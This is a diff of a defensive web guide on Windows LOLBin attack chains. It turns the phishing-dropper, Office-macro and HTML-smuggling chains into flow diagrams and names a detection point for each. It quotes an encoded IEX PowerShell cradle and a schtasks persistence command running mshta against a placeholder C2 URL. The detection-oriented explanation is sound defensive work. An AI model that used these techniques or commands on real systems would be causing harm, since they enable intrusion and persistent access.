@@ -192,7 +192,14 @@
           <p>Most real-world LOLBin campaigns use multiple patterns in sequence. An attacker who gains initial access via a phishing attachment will use a download cradle to fetch their implant, an execution proxy to run it, and a persistence mechanism to survive reboots. Detecting any single step breaks the chain. Detecting the pattern across multiple steps is harder to evade.</p>
 
           <h3>Execution proxy</h3>
-          <p>An execution proxy uses a trusted Windows binary as a wrapper to run attacker code. The most common examples: mshta.exe with a URL or local HTA file, regsvr32.exe loading a remote .sct script (the Squiblydoo technique, named for the LOLBAS project entry), rundll32.exe calling an exported function from a dropped DLL, and installutil.exe running C# code via the InstallUtil serialization callback. In every case, the binary that appears in process logs is a signed Windows tool, not the attacker's code.</p>
+          <p>An execution proxy uses a trusted Windows binary as a wrapper to run attacker code. The most common examples:</p>
+          <ul>
+            <li>mshta.exe with a URL or local HTA file</li>
+            <li>regsvr32.exe loading a remote .sct script (the Squiblydoo technique, named for the LOLBAS project entry)</li>
+            <li>rundll32.exe calling an exported function from a dropped DLL</li>
+            <li>installutil.exe running C# code via the InstallUtil serialization callback</li>
+          </ul>
+          <p>In every case, the binary that appears in process logs is a signed Windows tool, not the attacker's code.</p>
 
           <h3>Download cradle</h3>
           <p>A download cradle fetches attacker-controlled content from a remote server. It is almost always the first action after initial access. The tool used determines how the download appears in network and process logs, which is why attackers choose carefully based on what detection controls exist in the target environment.</p>
@@ -297,35 +304,107 @@
 
           <h3>Chain 1: Phishing email dropper</h3>
           <p>This chain is among the most common in commodity malware campaigns.</p>
-          <ol>
-            <li><strong>Email client opens attachment</strong>: The user opens a .vbs or .js file attached to a phishing email. The mail client spawns wscript.exe directly.</li>
-            <li><strong>wscript.exe runs VBS dropper</strong>: The VBScript uses <code>XMLHTTP</code> to download a stage-2 binary via certutil or a PowerShell one-liner, saving it to <code>%TEMP%</code>.</li>
-            <li><strong>Stage 2 runs as rundll32 or mshta</strong>: The downloaded payload is a DLL invoked via rundll32.exe, or an HTA file run by mshta.exe. Both are trusted Windows binaries.</li>
-            <li><strong>Persistence via schtasks</strong>: The implant creates a scheduled task using schtasks.exe with an mshta or wscript action pointing to a remote URL.</li>
-          </ol>
+          <div class="process-flow">
+            <div class="flow-step">
+              <span class="flow-step-num">1</span>
+              <div class="flow-step-title">Email Client Opens Attachment</div>
+              <div class="flow-step-desc">The user opens a .vbs or .js file attached to a phishing email. The mail client spawns wscript.exe directly.</div>
+            </div>
+            <div class="flow-arrow">&#8594;</div>
+            <div class="flow-step">
+              <span class="flow-step-num">2</span>
+              <div class="flow-step-title">wscript.exe Runs VBS Dropper</div>
+              <div class="flow-step-desc">The VBScript uses XMLHTTP to download a stage-2 binary via certutil or a PowerShell one-liner, saving it to %TEMP%.</div>
+            </div>
+            <div class="flow-arrow">&#8594;</div>
+            <div class="flow-step">
+              <span class="flow-step-num">3</span>
+              <div class="flow-step-title">Stage 2 Runs as rundll32 or mshta</div>
+              <div class="flow-step-desc">The downloaded payload is a DLL invoked via rundll32.exe, or an HTA file run by mshta.exe. Both are trusted Windows binaries.</div>
+            </div>
+            <div class="flow-arrow">&#8594;</div>
+            <div class="flow-step">
+              <span class="flow-step-num">4</span>
+              <div class="flow-step-title">Persistence via schtasks</div>
+              <div class="flow-step-desc">The implant creates a scheduled task using schtasks.exe with an mshta or wscript action pointing to a remote URL.</div>
+            </div>
+          </div>
           <p><strong>Highest-value detection point:</strong> Step 1. Email client (Outlook.exe, Thunderbird.exe) spawning wscript.exe is almost never legitimate. This parent-child relationship is a near-certain indicator of malicious activity and should be a high-confidence alert.</p>
 
           <h3>Chain 2: Office macro</h3>
           <p>Office macros remain a dominant initial access vector despite decades of mitigations.</p>
-          <ol>
-            <li><strong>winword.exe opens malicious document</strong>: The user enables macros. The VBA macro runs.</li>
-            <li><strong>winword.exe spawns cmd.exe</strong>: The macro calls <code>Shell</code> to run a cmd command. This is the anomalous parent-child relationship.</li>
-            <li><strong>cmd.exe runs PowerShell download cradle</strong>: <code>powershell -enc [encoded IEX cradle]</code>. The payload is fetched from a C2 server and executed in memory.</li>
-            <li><strong>certutil downloads implant</strong>: As a fallback or alternative, certutil downloads a binary to <code>%TEMP%</code>.</li>
-            <li><strong>schtasks creates persistence</strong>: A scheduled task with <code>/tr "mshta.exe http://C2/persist.hta"</code> ensures the attacker maintains access through reboots.</li>
-          </ol>
+          <div class="process-flow">
+            <div class="flow-step">
+              <span class="flow-step-num">1</span>
+              <div class="flow-step-title">winword.exe Opens Malicious Document</div>
+              <div class="flow-step-desc">The user enables macros. The VBA macro runs.</div>
+            </div>
+            <div class="flow-arrow">&#8594;</div>
+            <div class="flow-step">
+              <span class="flow-step-num">2</span>
+              <div class="flow-step-title">winword.exe Spawns cmd.exe</div>
+              <div class="flow-step-desc">The macro calls Shell to run a cmd command. This is the anomalous parent-child relationship.</div>
+            </div>
+            <div class="flow-arrow">&#8594;</div>
+            <div class="flow-step">
+              <span class="flow-step-num">3</span>
+              <div class="flow-step-title">cmd.exe Runs PowerShell Cradle</div>
+              <div class="flow-step-desc">powershell -enc [encoded IEX cradle] fetches the payload from a C2 server and executes it in memory.</div>
+            </div>
+            <div class="flow-arrow">&#8594;</div>
+            <div class="flow-step">
+              <span class="flow-step-num">4</span>
+              <div class="flow-step-title">certutil Downloads Implant</div>
+              <div class="flow-step-desc">As a fallback or alternative, certutil downloads a binary to %TEMP%.</div>
+            </div>
+            <div class="flow-arrow">&#8594;</div>
+            <div class="flow-step">
+              <span class="flow-step-num">5</span>
+              <div class="flow-step-title">schtasks Creates Persistence</div>
+              <div class="flow-step-desc">A scheduled task with /tr "mshta.exe http://C2/persist.hta" ensures the attacker maintains access through reboots.</div>
+            </div>
+          </div>
           <p><strong>Highest-value detection point:</strong> Step 2. Office applications spawning cmd.exe, PowerShell, wscript, or certutil directly is a well-established detection rule and blocks the chain before any payload executes.</p>
 
           <h3>Chain 3: HTML smuggling</h3>
           <p>HTML smuggling bypasses email gateway file-type restrictions by encoding payloads inside HTML rather than attaching them directly.</p>
-          <ol>
-            <li><strong>Browser downloads HTML lure page</strong>: The user clicks a link or opens an HTML attachment. The page contains embedded JavaScript.</li>
-            <li><strong>JavaScript decodes payload in-browser</strong>: The script uses <code>atob()</code> or a custom decoder to reconstruct a binary payload (typically a .hta, .iso, or .zip file) from base64 strings embedded in the HTML.</li>
-            <li><strong>Browser saves decoded file locally</strong>: The JavaScript uses the HTML5 Blob API to trigger a file download. The browser saves a .hta or other file to the Downloads folder.</li>
-            <li><strong>mshta.exe executes the HTA</strong>: If the saved file is an HTA, double-clicking it launches mshta.exe. Many browsers open certain file types automatically.</li>
-            <li><strong>mshta spawns cmd</strong>: The HTA VBScript calls <code>WScript.Shell.Run "cmd /c ..."</code>.</li>
-            <li><strong>cmd runs certutil or PowerShell cradle</strong>: Stage 2 is fetched and executed.</li>
-          </ol>
+          <div class="process-flow">
+            <div class="flow-step">
+              <span class="flow-step-num">1</span>
+              <div class="flow-step-title">Browser Downloads HTML Lure</div>
+              <div class="flow-step-desc">The user clicks a link or opens an HTML attachment. The page contains embedded JavaScript.</div>
+            </div>
+            <div class="flow-arrow">&#8594;</div>
+            <div class="flow-step">
+              <span class="flow-step-num">2</span>
+              <div class="flow-step-title">JavaScript Decodes Payload</div>
+              <div class="flow-step-desc">The script uses atob() or a custom decoder to reconstruct a binary payload (typically a .hta, .iso, or .zip file) from base64 strings embedded in the HTML.</div>
+            </div>
+            <div class="flow-arrow">&#8594;</div>
+            <div class="flow-step">
+              <span class="flow-step-num">3</span>
+              <div class="flow-step-title">Browser Saves Decoded File</div>
+              <div class="flow-step-desc">The JavaScript uses the HTML5 Blob API to trigger a file download. The browser saves a .hta or other file to the Downloads folder.</div>
+            </div>
+            <div class="flow-arrow">&#8594;</div>
+            <div class="flow-step">
+              <span class="flow-step-num">4</span>
+              <div class="flow-step-title">mshta.exe Executes the HTA</div>
+              <div class="flow-step-desc">If the saved file is an HTA, double-clicking it launches mshta.exe. Many browsers open certain file types automatically.</div>
+            </div>
+            <div class="flow-arrow">&#8594;</div>
+            <div class="flow-step">
+              <span class="flow-step-num">5</span>
+              <div class="flow-step-title">mshta Spawns cmd</div>
+              <div class="flow-step-desc">The HTA VBScript calls WScript.Shell.Run "cmd /c ...".</div>
+            </div>
+            <div class="flow-arrow">&#8594;</div>
+            <div class="flow-step">
+              <span class="flow-step-num">6</span>
+              <div class="flow-step-title">cmd Runs Stage 2 Cradle</div>
+              <div class="flow-step-desc">certutil or a PowerShell cradle fetches and executes the next stage.</div>
+            </div>
+          </div>
           <p><strong>Highest-value detection point:</strong> Step 4. mshta.exe spawned by explorer.exe (from a user double-clicking a file) with an HTA from the Downloads or %TEMP% directory is a high-fidelity indicator. Browser-spawned mshta.exe is even more anomalous.</p>
         </section>
 
